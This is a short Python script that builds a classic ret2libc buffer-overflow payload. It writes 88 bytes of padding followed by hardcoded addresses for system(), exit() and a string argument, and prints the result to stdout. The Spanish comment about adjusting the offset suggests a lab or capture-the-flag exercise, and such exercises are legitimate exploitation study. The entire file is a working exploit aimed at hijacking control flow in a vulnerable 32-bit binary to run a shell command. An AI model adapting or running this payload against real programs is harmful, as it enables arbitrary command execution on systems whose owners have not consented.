#!/usr/bin/env python3
import struct
import sys

offset = 88 # Ajustar segun lo hallado
system_addr = 0xf7d81670
exit_addr = 0xf7d6c130
ls_addr = 0xf7efd956


payload = b"A" * offset
payload += struct.pack("<I", system_addr)
payload += struct.pack("<I", exit_addr) # Relleno
payload += struct.pack("<I", ls_addr)

sys.stdout.buffer.write(payload)